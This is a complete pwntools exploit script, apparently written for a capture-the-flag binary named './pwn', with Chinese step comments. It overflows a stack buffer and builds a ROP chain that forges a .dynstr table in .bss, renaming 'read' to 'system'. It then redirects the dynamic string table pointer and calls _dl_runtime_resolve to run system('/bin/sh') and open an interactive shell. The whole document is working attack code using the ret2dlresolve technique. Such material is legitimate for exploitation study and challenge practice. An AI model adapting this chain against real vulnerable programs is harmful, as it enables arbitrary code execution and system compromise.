from pwn import *

context.log_level = 'debug'

p = process('./pwn')
elf = ELF('./pwn')

offset = 0x108
fake_table = elf.bss() + 0x200
binsh_addr = elf.bss() + 0x300
dynstr_table_addr = 0x403178
start_resolve = 0x401020
dynstr_data = elf.get_section_by_name('.dynstr').data().replace(b'read', b'system')
pop_rdi = 0x40113a
pop_rsi_r15 = 0x401138

# step 0：在bss上构建一个fake dynstr table
payload = b'a' * offset + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(fake_table) + p64(0) + p64(elf.plt['read'])
# step 1：在bss上写一个binsh字符串，作为system函数参数
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(binsh_addr) + p64(0) + p64(elf.plt['read'])
# step 2：修改dynamic中的dynstr字符串表，将其改为伪造的dynstr table的地址
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(dynstr_table_addr) + p64(0) + p64(elf.plt['read'])
# step 3：给system添加参数后，手动触发_dl_runtime_resolve
payload += p64(pop_rdi) + p64(binsh_addr) + p64(start_resolve) + p64(0) # 0为伪造的reloc_index

p.send(payload)
p.send(dynstr_data) # fake dynstr table
p.send(b'/bin/sh\x00') # 最终函数参数
p.send(p64(fake_table)) # 修改dynstr table指针

p.interactive()